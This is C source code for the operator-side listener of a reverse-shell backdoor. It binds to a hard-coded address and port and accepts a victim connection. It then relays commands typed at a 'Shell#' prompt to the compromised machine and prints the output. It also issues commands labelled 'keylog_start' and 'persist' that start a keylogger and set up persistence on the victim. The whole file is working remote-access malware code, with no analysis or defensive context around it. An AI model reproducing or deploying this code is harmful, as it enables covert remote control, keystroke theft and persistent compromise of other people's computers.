#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		printf("Error Setting TCP Socket Options!\n");
		return 1;
	}
	//setup connection
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.68.5"); // Server IP address is set here
	server_address.sin_port = htons(50005); //server port

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)); //binds ip with port

	listen(sock, 5);  //how many connections can be accepted.

	client_length = sizeof(client_address); //length of client address. This is required due to the next line. It requires its address.
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);


	while(1){


		jump:
		bzero(&buffer, sizeof(buffer)); //sets buffer array values to zero.
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ",inet_ntoa(client_address.sin_addr)); //cmd prompt when successful connection is made.
		fgets(buffer, sizeof(buffer), stdin);  //reads new line until newline is encountered. Stores response to buffer
		strtok(buffer, "\n"); //removes char from string
		write(client_socket, buffer, sizeof(buffer));//gets response from client
		if (strncmp("q", buffer, 1) ==  0) { //if q, stop connection
			break;
		}
		else if (strncmp("cd ", buffer, 3) == 0) {
			goto jump;
		}
		else if (strncmp("keylog_start", buffer, 12) == 0) { //start keylogger
			goto jump;
		}
		else if (strncmp("persist", buffer, 7) == 0) { //if persist was send, get client response and display
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
		}
		else { //if anything else, get response from client.
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}

}
